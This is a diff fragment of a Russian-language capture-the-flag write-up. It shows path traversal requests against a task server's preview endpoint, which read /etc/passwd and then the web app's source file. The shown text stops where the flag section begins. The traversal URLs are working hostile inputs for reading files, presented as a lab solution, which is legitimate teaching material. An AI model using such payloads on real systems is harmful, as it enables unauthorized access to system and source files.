@@ -11,13 +11,16 @@ http://task.duckerz.ru:21045/preview?draft=courses/python101.md
 http://task.duckerz.ru:21045/preview?draft=../../../../etc/passwd
 ```
 ##### Результат:
+
 ![](../../images/open_course_1.png)
+
 В итоге уязвимость подтвердилась.
 # Эксплуатация уязвимости и поиск флага
 Посмотрим код web приложения:
 ```url
 http://task.duckerz.ru:21045/preview?draft=../../../../app/app.py
 ```
+
 ![](../../images/open_course_2.png)
 # Flag
 ```text
